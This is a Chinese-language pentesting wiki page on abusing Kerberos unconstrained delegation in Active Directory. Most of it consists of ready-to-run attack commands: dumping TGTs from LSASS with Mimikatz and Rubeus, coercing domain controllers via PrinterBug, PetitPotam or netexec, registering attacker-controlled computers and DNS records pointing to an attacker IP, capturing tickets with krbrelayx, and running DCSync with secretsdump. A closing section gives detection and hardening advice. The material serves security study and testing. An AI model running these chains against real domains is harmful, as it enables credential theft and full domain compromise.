# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

这是 Domain Administrator 可以为域内任意 **Computer** 设置的一项功能。之后，每当**用户登录**该 Computer，DC 就会将该用户的 **TGT 副本**随提供的 **TGS** 一同发送，并将其**保存在 LSASS 内存中**。因此，如果你在该机器上拥有 Administrator 权限，就可以**导出票据并在任意机器上冒充这些用户**。

因此，如果 Domain Admin 登录启用了“Unconstrained Delegation”功能的 Computer，而你在该机器上拥有本地管理员权限，就可以导出票据，并在域内任意位置冒充 Domain Admin（domain privesc）。

你可以检查 [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 属性是否包含 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)，以**查找带有此属性的 Computer 对象**。你可以使用 LDAP 筛选器 ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ 来查找，powerview 使用的就是这个筛选器：

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

将 Administrator（或受害用户）的 ticket 加载到内存中，使用 **Mimikatz** 或 **Rubeus 进行** [**Pass the Ticket**](pass-the-ticket.md)**。**\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**在 ired.team 查看关于 Unconstrained delegation 的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **强制身份验证**

如果攻击者能够**攻陷一台允许使用 "Unconstrained Delegation" 的计算机**，就可以**诱骗**一台**打印服务器**向其**自动登录**，并将 TGT 保存到服务器内存中。\
随后，攻击者可以执行 **Pass the Ticket 攻击来冒充**打印服务器计算机账户对应的用户。

要让打印服务器向任意计算机登录，可以使用 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)：

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

如果 TGT 来自域控制器，你可以执行 [**DCSync attack**](acl-persistence-abuse/index.html#dcsync)，并获取 DC 中的所有哈希。\
[**在 ired.team 上了解有关此攻击的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

在此查找其他**强制身份验证**的方法：


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

任何其他能迫使受害者通过 **Kerberos** 向你的 unconstrained-delegation 主机进行身份验证的 coercion primitive 也同样有效。在现代环境中，通常需要根据可访问的 RPC 接口，将经典的 PrinterBug 流程替换为 **PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN** 或基于 **WebClient/WebDAV** 的 coercion。

### 滥用配置了 unconstrained delegation 的用户/服务账户

Unconstrained delegation **并不局限于计算机对象**。**用户/服务账户**也可以配置为 `TRUSTED_FOR_DELEGATION`。在这种情况下，实际要求是该账户必须接收发给其**所拥有的 SPN**的 Kerberos 服务票据。

这会带来 2 种非常常见的 offensive 路径：

1. 你攻陷了配置了 unconstrained delegation 的**用户账户**的密码/哈希，然后向该账户**添加一个 SPN**。
2. 该账户已经有一个或多个 SPN，但其中一个指向**已失效/已停用的主机名**；重新创建缺失的 **DNS A 记录**即可劫持身份验证流程，无需修改 SPN 集合。<sup>[[8]](#references)</sup>

最简 Linux 流程：

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Notes:

- 当 unconstrained principal 是 **service account**，而你只有它的凭据、无法在已加入域的主机上执行代码时，这种方法尤其有用。
- 如果目标用户已有 **stale SPN**，重新创建相应的 **DNS record**，可能比向 AD 写入新的 SPN 更不容易引起注意。
- 近期以 Linux 为中心的 tradecraft 使用 `addspn.py`、`dnstool.py`、`krbrelayx.py` 和一种 coercion primitive；完成整个攻击链不需要接触 Windows 主机。

### 利用攻击者创建的计算机滥用 Unconstrained Delegation

现代域通常设置 `MachineAccountQuota > 0`（默认值为 10），允许任何经过身份验证的 principal 创建最多 N 个计算机对象。如果你还持有 `SeEnableDelegationPrivilege` token privilege（或等效权限），就可以将新创建的计算机设置为受信任的 unconstrained delegation 对象，并从特权系统收集入站 TGT。<sup>[[1]](#references)</sup>

高层流程：

1) 创建一台由你控制的计算机

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) 使伪造的主机名可在域内解析

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) 在攻击者控制的计算机上启用 Unconstrained Delegation

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

为何有效：在 unconstrained delegation 中，启用了 delegation 的计算机会在其 LSA 中缓存入站 TGT。如果诱使 DC 或特权服务器向你的伪造主机进行身份验证，其机器 TGT 就会被存储下来并可导出。

4) 以导出模式启动 krbrelayx，并准备 Kerberos 材料

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) 诱使 DC/服务器向你的伪造主机进行身份验证

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx 会在机器进行身份验证时保存 ccache 文件，例如：

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) 使用捕获的 DC 机器 TGT 执行 DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

- 注意事项和要求：

- `MachineAccountQuota > 0` 可允许非特权用户创建计算机帐户；否则需要显式权限。
- 在计算机上设置 `TRUSTED_FOR_DELEGATION` 需要 `SeEnableDelegationPrivilege`（或域管理员权限）。
- 确保名称解析指向你的 fake host（DNS A 记录），以便 DC 能通过 FQDN 访问它。
- 强制认证需要可行的利用向量（PrinterBug/MS-RPRN、EFSRPC/PetitPotam、DFSCoerce、MS-EVEN 等）。如果可行，请在 DC 上禁用这些功能。
- 如果受害者帐户被标记为 **“帐户敏感，不能被委派”** 或属于 **Protected Users**，转发的 TGT 不会包含在服务票据中，因此此攻击链无法获取可复用的 TGT。<sup>[[9]](#references)</sup>
- 如果进行身份验证的客户端/服务器启用了 **Credential Guard**，Windows 会阻止 **Kerberos unconstrained delegation**，这可能导致原本有效的强制认证路径从操作人员的角度看失败。

检测与加固建议：

- 对设置了 UAC `TRUSTED_FOR_DELEGATION` 的计算机帐户创建事件 ID 4741，以及计算机/用户帐户变更事件 4742/4738 发出警报。
- 监控域区域中异常的 DNS A 记录新增情况。
- 关注来自意外主机的 4768/4769 事件激增，以及 DC 对非 DC 主机进行身份验证的情况。
- 将 `SeEnableDelegationPrivilege` 限制给尽可能少的帐户；在可行时将 `MachineAccountQuota=0`，并在 DC 上禁用 Print Spooler。强制启用 LDAP signing 和 channel binding。

### 缓解措施

- 将 DA/Admin 登录限制到特定服务
- 为特权帐户设置“帐户敏感，不能被委派”。

## References

- [1] [HTB：Delegate — SYSVOL 凭据 → Targeted Kerberoast → Unconstrained Delegation → DCSync 获取 DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – 通过 unrestricted delegation 入侵域](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Active Directory 中的 Unconstrained Delegation](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users 安全组](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – 通过 DC print server 和 Kerberos delegation 入侵域](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
